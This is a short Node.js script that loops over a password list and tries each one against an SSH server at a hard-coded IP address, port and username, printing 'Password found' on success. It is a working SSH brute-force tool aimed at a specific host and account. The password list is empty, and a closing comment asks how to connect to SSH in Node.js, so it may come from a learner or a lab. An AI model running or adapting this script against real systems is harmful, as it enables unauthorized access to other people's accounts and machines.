const fs = require('fs')
const path = require('path')
const {Client} = require('ssh2')
const sshConnection = require('ssh2-connect')
const passwordArray = [
   
]

for(let i=0; i < passwordArray.length; i++){
    (async () => {
        try{
            let sshConn = await sshConnection({
                host: '161.53.171.105',
                username: 'pecelar22',
                password: `${passwordArray[i]}`,
                port: '10001'
            })
            console.log(`Password found: ${passwordArray[i]}`)
            sshConn.end()
        }
        catch(error){
            console.log('Wrong password')
        }
    })()
}

//how to conect to ssh using nodejs?

